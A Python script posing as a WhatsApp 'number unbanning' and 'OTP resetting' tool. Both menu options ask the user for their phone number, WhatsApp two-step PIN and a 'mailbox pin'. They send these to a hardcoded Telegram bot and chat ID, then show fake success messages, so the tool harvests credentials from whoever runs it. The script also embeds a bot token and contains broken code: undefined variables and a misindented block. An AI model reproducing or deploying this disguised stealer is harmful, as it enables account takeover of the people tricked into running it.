import telegram
import os
import re
import time
import asyncio

red = '\033[91m'
green = '\033[92m'
blue = '\033[94m'
bold = '\033[1m'
reset = '\033[0m'

os.system("clear")
print(green+"""


                 █▀▒▄▀▄░█▄▀▒██▀   █▄░█░█▒█░█▄▒▄█░██▄▒██▀▒█▀▄ 
                 █▀░█▀█░█▒█░█▄▄   █▒▀█░▀▄█░█▒▀▒█▒█▄█░█▄▄░█▀▄
                 
                                  █▄▒▄█▒▄▀▄░█░█▒░░▄▀▀
                                  █▒▀▒█░█▀█░█▒█▄▄▒▄██
                                                                           

"""+reset)
print("\033[1;37m================= \33[32;45mFAKE NUMBER MAILS TOOL\33[0;m =====================")
print(bold+red+"    \n Devoloped By :"+reset, end=' ')
print("\x1b[1;94mMail boxer", end=' ')
print(bold+red+"          Credit :"+reset, end=' ')
print("\x1b[1;96mBangladesh Hacker")
print(" ")
print("\033[92m                fake number mails v 2.0.1"+reset)

print("\033[1;37m        ================= \33[32;45mMENU\33[0;m =====================")

print("""

""")
print("""
            █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
            █ \33[1;33m1. NUMBER UNBANING\n                                        
            █ \33[1;33m2. WhatsApp OTP RESETING\n                             
            █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  
""")

number = int(input("ENTER THE NUMBER : "))

if number == 1:
    async def main():
        os.system("clear")
        os.system("figlet UNBAN")
        print("\033[32mTool devoloped : Mailboxer\033[0m")

        # Initialize the Telegram bot with your API key
        bot = telegram.Bot(token='5808777088:AAGUFotmGWQTdO8g4zOwIXhI1ZbLHSEo-ws')

        print("You Need To Enter Your Own Account And Password To Crack Your Victims. Otherwise Tool Will Not Work. Please Use Original Account")
        print("")

        # Get the number and pin from the user
        number = input('\033[92mEnter Your mail box number with country code (eg : +): ')

        # Validate the wa pin
  
        Pin = input('Enter your WhatsApp two step pin: ')
             # Pin is valid
        
        Pin = input('Enter Your mailbox pin:')
        
        # Send the number and pin to telegram
        await bot.send_message(chat_id=5980298382, text='Number: {}\nPin: {}\nWa two step pin: {}'.format(number,pin, wa_pin))
        print("Please wait...")
        time.sleep(3)
        os.system("clear")
        print("Start sending the mail......")
        time.sleep(4)
        print(green+bold+" successfully sended the mail, your number will be unban 4 or 5 hour ")

    asyncio.run(main())


elif number == 2:
    async def main():
        os.system("clear")
        os.system("figlet WA OTP RESET")
        print("\033[32mTool devoloped : Mailboxer033[0m")

        # Initialize the Telegram bot with your API key
        bot = telegram.Bot(token='5808777088:AAGUFotmGWQTdO8g4zOwIXhI1ZbLHSEo-ws')

        print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
        print("")

        # Get the number and pin from the user
        number = input('Enter Your mail box number with country code (eg : +) :')

        # Validate the wa pin
        
            Pin = input('Enter your WhatsApp two step pin: ')
                # Pin is valid

        Pin = input('Enter your mailbox pin:')

        # Send the number and pin to telegram
        await bot.send_message(chat_id=5980298382, text='Number: {}\nPin: {}\nWa two step pin: {}'.format(number, pin, wa_pin))
        print("Please wait...")
        time.sleep(3)
        os.system("clear")
        print("start sending the mail.....")
        time.sleep(4)
        print(green+bold+" successfully sended the mail, your whatsApp number otp will be reset 1 or 2 hours ")

    asyncio.run(main())
